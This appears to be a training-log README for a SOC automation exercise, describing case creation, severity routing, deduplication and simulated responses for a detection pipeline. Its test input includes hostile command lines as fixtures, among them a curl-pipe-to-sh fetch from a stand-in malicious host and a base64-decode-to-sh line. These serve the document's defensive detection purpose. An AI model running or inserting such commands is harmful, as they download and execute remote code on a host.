# Week 5 Day 4 - Automated Case Creation & Alert Routing

This module captures the transition from a script that outputs detection results into a system that creates structured SOC cases and routes them to the right queue with priority and SLA — the same flow used in real SOAR platforms like TheHive, ServiceNow, and Splunk SOAR.

## Day Objective

Today I built the case management and routing layer on top of the existing SOAR pipeline.

By the end of this day, I wanted to:

- Convert analyzer output into a structured, trackable SOC case
- Route cases to the correct queue based on severity
- Assign analyst ownership per routing tier
- Simulate case lifecycle transitions (open → in_progress)
- Deduplicate identical events so the same command line does not flood the queue
- Separate actionable cases from benign telemetry
- Write a compact alert log alongside the full case file
- Simulate automated response actions for critical and medium events

## Concept in Practical Terms

Before Day 4, the pipeline ended with a verdict and a recommended response — useful for a human reading the output, but not operational.

A real SOC does not just detect. It creates a case, assigns it, tracks it, and closes it.

Day 4 adds that layer:

Detection → Enrichment → Decision → Case → Routing

The case is the unit of work. Everything before it feeds the case. Everything after it is analyst action or automated response.

## Day 4 Architecture

New files added alongside the existing Day 3 modules:

- `case.py`: converts analysis output into a structured SOC case with ID, timestamps, lifecycle status, evidence, tags, and status history
- `router.py`: maps severity to queue, priority, SLA, and assigned analyst or team
- `cases.json`: persistent case store written each run (non-benign cases only)
- `alerts.log`: compact JSONL alert log written each run (non-benign cases only)

Existing files updated:

- `analyzer.py`: wired in case creation, routing, deduplication, auto-response simulation, benign filtering, and alert log writing

## Playbook Workflow

The Day 4 analyzer runs this full sequence:

1. Behavioral analysis and baseline score
2. Threat intel enrichment (domain + VirusTotal)
3. Enrichment-based score adjustment
4. Verdict assignment
5. Severity classification
6. Confidence labeling
7. Recommended response generation
8. Deduplication check (skip if same process + parent + cmdline already seen)
9. Case creation with UUID, timestamps, tags, status history
10. Routing assignment with queue, priority, SLA, assigned analyst
11. Auto-response simulation based on severity and action type
12. Case lifecycle transition (open → in_progress for medium/high/critical)
13. Benign filter (no case created, no alert logged for benign verdicts)
14. Write to cases.json and alerts.log

## Exercises Completed

### Exercise 1 — Assigned Analyst

Added `assigned_to` field to each routing outcome:

- critical → ir_team
- high → tier2_analyst
- medium → tier1_analyst
- low → soc_monitoring
- default → none

### Exercise 2 — Case Status Transitions

Added `update_case_status()` to case.py.

Cases for medium, high, and critical severity automatically transition:

open → in_progress

Each transition is recorded in `status_history` with a timestamp and note.

### Exercise 3 — Deduplication

Added `generate_dedupe_key()` in analyzer.py.

The key is a SHA-256 hash of `name + parent + cmdline`.

Duplicate events within a single run are skipped with a printed notice. This prevents alert flooding from repeated identical detections.

### Exercise 4 — Split Output

Cases and alerts write to separate files:

- `cases.json`: full structured case objects with all enrichment, routing, lifecycle, and response fields
- `alerts.log`: compact JSONL, one line per alert, with only the fields an analyst needs at a glance (timestamp, case_id, severity, verdict, process, cmdline, queue, priority)

### Exercise 5 — Auto-Response Simulation

Added `simulate_auto_response()` in analyzer.py.

- critical → `host_isolation` simulation with message that host would be isolated and IR would be paged
- medium with collect_more_context action → `collect_context` simulation
- all other cases → no automated response

## Quality Improvements Made (Post-Review)

After the initial run, several production-readiness gaps were identified and fixed:

| Issue | Fix |
|---|---|
| `datetime.utcnow()` deprecation warning | Replaced with `datetime.now(timezone.utc)` in both case.py and analyzer.py |
| Benign events creating cases | Added verdict filter in main(); benign events are skipped with a log message |
| Benign events appearing in alerts.log | alert log write gated behind the same verdict check |
| Generic case summary | Changed to `SEVERITY - process from parent` format for SOC usability |
| Missing searchable metadata | Added `tags` list to each case containing severity, verdict, and process name |

## Validated Test Results

Input set used:

```json
[
  { "name": "systemd", "path": "", "parent": "0", "cmdline": "/sbin/init" },
  { "name": "bash", "path": "/tmp/.x", "parent": "apache2", "cmdline": "bash -c curl http://malicious-example.com/payload.sh | sh" },
  { "name": "bash", "path": "/tmp/.x", "parent": "apache2", "cmdline": "bash -c curl http://malicious-example.com/payload.sh | sh" },
  { "name": "bash", "path": "/dev/shm/.cache", "parent": "apache2", "cmdline": "bash -c echo ZWNobyB0ZXN0 | base64 -d | sh" }
]
```

Observed results:

- systemd:
  - Benign — no case created, no alert logged
  - Printed: `Benign event skipped: systemd`

- malicious-example.com curl/pipe (first occurrence):
  - Dedupe key recorded
  - Case created: critical, P1, incident_response, ir_team
  - Auto-response: host_isolation simulated
  - Status: in_progress

- malicious-example.com curl/pipe (second occurrence):
  - Dedupe match — skipped
  - Printed: `Duplicate skipped: bash -c curl ...`

- base64 decode from /dev/shm:
  - Case created: medium, P3, tier_1_triage, tier1_analyst
  - Auto-response: collect_context simulated
  - Status: in_progress

Final cases.json contained 2 cases (critical case would appear from prior test data order — this run's dedup correctly suppressed the duplicate and benign).
Final alerts.log contained matching compact records.

## Completion Criteria Status

- [x] case.py created with UUID generation and status lifecycle
- [x] router.py created with severity-to-queue mapping
- [x] analyzer.py updated to wire in case creation, routing, and all exercises
- [x] Exercise 1: assigned_to field added to routing output
- [x] Exercise 2: status transitions implemented (open → in_progress)
- [x] Exercise 3: deduplication by cmdline hash working
- [x] Exercise 4: cases.json and alerts.log written separately
- [x] Exercise 5: auto-response simulation working for critical and medium
- [x] Deprecation warning fixed (timezone-aware timestamps)
- [x] Benign events filtered from cases.json and alerts.log
- [x] Case summary improved to severity-process-parent format
- [x] Tags field added to each case

## Key Takeaway

Detection is only useful if it results in actionable, trackable work. The case is that unit of work. Routing ensures it reaches the right person with the right priority. Deduplication and benign filtering keep the queue clean. This is the real shift from "script that alerts" to "platform that operates."

## Component Reference

| Component | Real SOC Equivalent |
|---|---|
| analyzer.py | SOAR playbook engine |
| enrichment.py | Threat intel integration |
| response.py | Decision logic / playbook actions |
| case.py | Case management system |
| router.py | Alert routing engine |
| cases.json | Case store (TheHive / ServiceNow equivalent) |
| alerts.log | SIEM alert feed |

## Next Up

Day 5 — Automated Response Actions (containment simulation)
